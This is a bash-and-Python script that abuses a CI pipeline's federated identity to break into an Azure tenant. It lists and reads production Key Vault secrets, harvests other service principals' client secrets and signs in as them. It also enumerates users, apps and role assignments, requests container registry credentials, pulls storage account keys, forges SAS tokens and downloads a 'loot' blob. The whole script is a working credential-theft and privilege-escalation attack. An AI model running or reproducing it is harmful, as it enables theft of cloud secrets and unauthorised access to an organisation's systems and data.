#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
KV_PROD="kv-tbl-prod-x3euoz"
KV_SEC="kv-tbl-sec-x3euoz"
STORAGE_ACC="sttblcilogsprodx3euoz"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Get cicd-deployer ARM token + list ALL KV prod secrets
echo "=== LIST ALL KV PROD SECRETS ==="
az keyvault secret list --vault-name $KV_PROD --output json 2>/dev/null | python3 -c "
import sys,json
items = json.load(sys.stdin)
for s in items:
    name = s['name']
    print(f'SECRET: {name}')
" || echo "LIST_FAILED"

echo "=== GET DIRECTORY-AUDIT + SYNC CREDS ==="
for SP in directory-audit-principal sync-service-principal; do
  RAW=$(az keyvault secret show --vault-name $KV_PROD --name $SP 2>/dev/null)
  CID=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
  SEC=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
  export "CID_${SP//-/_}"="$CID"
  export "SEC_${SP//-/_}"="$SEC"
  echo "$SP: $CID sec_len=${#SEC}"
done

# Get reporting-insights creds if they exist
for CANDIDATE in reporting-insights-principal tbl-reporting-insights insights-principal; do
  RAW2=$(az keyvault secret show --vault-name $KV_PROD --name $CANDIDATE 2>/dev/null)
  if [ $? -eq 0 ]; then
    CID2=$(echo "$RAW2" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
    SEC2=$(echo "$RAW2" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
    echo "FOUND $CANDIDATE: $CID2 sec_len=${#SEC2}"
    export CID_INSIGHTS="$CID2"
    export SEC_INSIGHTS="$SEC2"
    break
  fi
done

CICD_ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null)
echo "CICD_ARM_LEN=${#CICD_ARM}"
export CICD_ARM

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, base64, re, hmac, hashlib, datetime

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
KV_SEC = "kv-tbl-sec-x3euoz"
KV_PROD = "kv-tbl-prod-x3euoz"
STORAGE_ACC = "sttblcilogsprodx3euoz"
D2CD_OID = "d2cdf247-9319-40cb-8324-5a005ef538da"
INSIGHTS_OID = "92a74471-fd09-41a6-be80-53e952a85f6d"
DIRSYNC_OID = "1b513b26-a18d-4d20-ac5f-e19bab1be785"

def http(url, tok, method="GET", data=None, extra_headers=None):
    h = {"Authorization": "Bearer " + tok}
    if extra_headers: h.update(extra_headers)
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
        elif isinstance(data, str): data = data.encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:500]
    except Exception as e:
        return 0, str(e)[:200]

def sp_tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except: return ""

CICD_ARM = os.environ.get("CICD_ARM", "")
output = []

# === 1. List KV sec secrets via ARM (cicd-deployer Reader on Platform RG) ===
print("\n=== 1. List KV sec secrets via ARM ===")
if CICD_ARM:
    # ARM list of secrets (names + metadata, NOT values)
    s, b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/{KV_SEC}/secrets?api-version=2023-07-01", CICD_ARM)
    print(f"KV sec secrets list (ARM): {s}")
    try:
        sec_list = json.loads(b)
        for sec in sec_list.get("value", []):
            name = sec.get("name", "")
            attrs = sec.get("properties", {}).get("attributes", {})
            print(f"  secret: {name} enabled={attrs.get('enabled','')} updated={attrs.get('updated','')}")
            output.append(f"KVSEC_SECRET={name}")
            # For each secret name, check if tbl-legacy-admin has secret-level RBAC
            s_ra, b_ra = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/{KV_SEC}/secrets/{name}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", CICD_ARM)
            print(f"  secret-level RA for '{name}': {s_ra}: {b_ra[:500]}")
            output.append(f"SECRET_RA_{name}={s_ra}:{b_ra[:300]}")
    except: print(b[:1000])

    # Full KV sec vault properties
    s_kv, b_kv = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/{KV_SEC}?api-version=2023-07-01", CICD_ARM)
    print(f"\nKV sec full props: {s_kv}")
    try:
        kv_props = json.loads(b_kv)
        props = kv_props.get("properties", {})
        print(f"  enableRbacAuthorization={props.get('enableRbacAuthorization','')} enabledForDeployment={props.get('enabledForDeployment','')}")
        print(f"  accessPolicies count={len(props.get('accessPolicies',[]))}")
        for ap in props.get("accessPolicies", []):
            print(f"  AP: oid={ap.get('objectId','')} perms={ap.get('permissions',{})}")
            output.append(f"AP_{ap.get('objectId','')}={ap.get('permissions',{})}")
    except: print(b_kv[:2000])

    # Check role assignments for tbl-reporting-insights and tbl-directory-sync
    for oid, label in [
        (INSIGHTS_OID, "tbl-reporting-insights"),
        (DIRSYNC_OID, "tbl-directory-sync"),
        (D2CD_OID, "d2cdf247-user"),
    ]:
        s_r, b_r = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{oid}%27", CICD_ARM)
        print(f"\n{label} ({oid[:8]}) role assignments: {s_r}")
        try:
            ras = json.loads(b_r)
            for ra in ras.get("value", []):
                scope = ra.get("properties", {}).get("scope", "")
                role = ra.get("properties", {}).get("roleDefinitionId", "").split("/")[-1]
                print(f"  scope={scope} role={role} type={ra.get('properties',{}).get('principalType','')}")
                output.append(f"RA_{label}={scope}::{role}")
        except: print(b_r[:500])

    # Try to list ACR repositories
    s_acr, b_acr = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz?api-version=2023-01-01-preview", CICD_ARM)
    print(f"\nACR props: {s_acr}: {b_acr[:500]}")
    # Try ACR list credentials
    s_acrc, b_acrc = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-01-01-preview", CICD_ARM, method="POST")
    print(f"ACR credentials: {s_acrc}: {b_acrc[:500]}")
    output.append(f"ACR_CREDS={s_acrc}:{b_acrc[:200]}")

# === 2. directory-audit: look up d2cdf247 user ===
print("\n=== 2. Look up d2cdf247 user ===")
DA_CID = os.environ.get("CID_directory_audit_principal", "")
DA_SEC = os.environ.get("SEC_directory_audit_principal", "")
DA_GRAPH = sp_tok(DA_CID, DA_SEC, "https://graph.microsoft.com/.default")
print(f"DA graph token len={len(DA_GRAPH)}")
if DA_GRAPH:
    s_u, b_u = http(f"https://graph.microsoft.com/v1.0/users/{D2CD_OID}", DA_GRAPH)
    print(f"d2cdf247 as user: {s_u}: {b_u[:1000]}")
    if s_u == 200:
        try:
            u = json.loads(b_u)
            output.append(f"D2CD_USER=upn={u.get('userPrincipalName','')} displayName={u.get('displayName','')} mail={u.get('mail','')}")
        except: pass

    # List ALL users in the tenant
    s_ul, b_ul = http("https://graph.microsoft.com/v1.0/users?$select=id,displayName,userPrincipalName,mail&$top=20", DA_GRAPH)
    print(f"\nAll users: {s_ul}")
    try:
        users = json.loads(b_ul)
        for u in users.get("value", []):
            print(f"  oid={u['id']} upn={u.get('userPrincipalName','')} name={u.get('displayName','')}")
            output.append(f"USER={u['id']}::{u.get('userPrincipalName','')}::{u.get('displayName','')}")
    except: print(b_ul[:1000])

    # Check if tbl-reporting-insights has credentials (password credentials on its app)
    # First find the app by appId
    s_app, b_app = http(f"https://graph.microsoft.com/v1.0/applications?$filter=appId+eq+'6eb124e3-de61-4fc9-a124-213d98d737f5'&$select=id,appId,displayName,passwordCredentials,keyCredentials", DA_GRAPH)
    print(f"\ntbl-reporting-insights app: {s_app}: {b_app[:1000]}")

    # Also check tbl-directory-sync app
    s_app2, b_app2 = http(f"https://graph.microsoft.com/v1.0/applications?$filter=appId+eq+'7c2e61eb-f928-45cd-99c9-20da958dd216'&$select=id,appId,displayName,passwordCredentials,keyCredentials,federatedIdentityCredentials", DA_GRAPH)
    print(f"\ntbl-directory-sync app: {s_app2}: {b_app2[:1000]}")

    # List ALL apps
    s_all_apps, b_all_apps = http("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName&$top=50", DA_GRAPH)
    print(f"\nAll apps: {s_all_apps}: {b_all_apps[:3000]}")

# === 3. Get full mi_loot_1792639046.json ===
print("\n=== 3. Full loot file ===")
SS_CID = os.environ.get("CID_sync_service_principal", "")
SS_SEC = os.environ.get("SEC_sync_service_principal", "")
SS_ARM = sp_tok(SS_CID, SS_SEC, "https://management.azure.com/.default")
if SS_ARM:
    s_k, b_k = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{STORAGE_ACC}/listKeys?api-version=2023-01-01", SS_ARM, method="POST")
    if s_k == 200:
        keys = json.loads(b_k).get("keys", [])
        SS_KEY = keys[0].get("value", "") if keys else ""
        print(f"Storage key len={len(SS_KEY)}")

        if SS_KEY:
            def make_sas(acc, key, perms="rl", services="b", resource_types="co"):
                ver = "2021-08-06"
                now = datetime.datetime.now(datetime.timezone.utc)
                st = (now - datetime.timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
                se = (now + datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
                sign_str = "\n".join([acc, perms, services, resource_types, st, se, "", "https", ver, ""]) + "\n"
                key_bytes = base64.b64decode(key)
                sig = base64.b64encode(hmac.new(key_bytes, sign_str.encode("utf-8"), hashlib.sha256).digest()).decode()
                return urllib.parse.urlencode({"sv": ver, "ss": services, "srt": resource_types, "sp": perms, "st": st, "se": se, "spr": "https", "sig": sig})

            sas = make_sas(STORAGE_ACC, SS_KEY)

            # Get FULL mi_loot file
            blob_url = f"https://{STORAGE_ACC}.blob.core.windows.net/loot/mi_loot_1792639046.json?{sas}"
            try:
                rb = urllib.request.urlopen(urllib.request.Request(blob_url), timeout=15)
                content = rb.read().decode(errors="replace")
                print(f"mi_loot FULL ({len(content)} chars):")
                print(content)  # Print everything
                output.append(f"MI_LOOT_FULL={content}")
            except Exception as ex:
                print(f"mi_loot err: {str(ex)[:100]}")

            # List ALL containers
            all_url = f"https://{STORAGE_ACC}.blob.core.windows.net/?comp=list&{sas}"
            try:
                r_all = urllib.request.urlopen(urllib.request.Request(all_url), timeout=20)
                all_xml = r_all.read().decode()
                containers = re.findall(r"<Name>([^<]+)</Name>", all_xml)
                print(f"\nAll containers: {containers}")
            except Exception as ex:
                print(f"containers err: {str(ex)[:100]}")

# === 4. tbl-reporting-insights SP credentials check ===
print("\n=== 4. Try reporting-insights credentials ===")
CID_RI = os.environ.get("CID_INSIGHTS", "")
SEC_RI = os.environ.get("SEC_INSIGHTS", "")
if CID_RI and SEC_RI:
    print(f"Got reporting-insights creds: {CID_RI}")
    ri_arm = sp_tok(CID_RI, SEC_RI, "https://management.azure.com/.default")
    ri_vault = sp_tok(CID_RI, SEC_RI, "https://vault.azure.net/.default")
    print(f"  ARM token len={len(ri_arm)} vault token len={len(ri_vault)}")
    if ri_vault:
        s_fl, b_fl = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", ri_vault)
        print(f"  KV sec secrets (data plane): {s_fl}: {b_fl[:500]}")
        output.append(f"RI_KVSEC={s_fl}:{b_fl[:200]}")
else:
    print("No reporting-insights credentials found in KV prod")

print(f"\n=== OUTPUT ({len(output)} items) ===")
for o in output:
    print(o[:400])

PYEOF

echo "DONE"
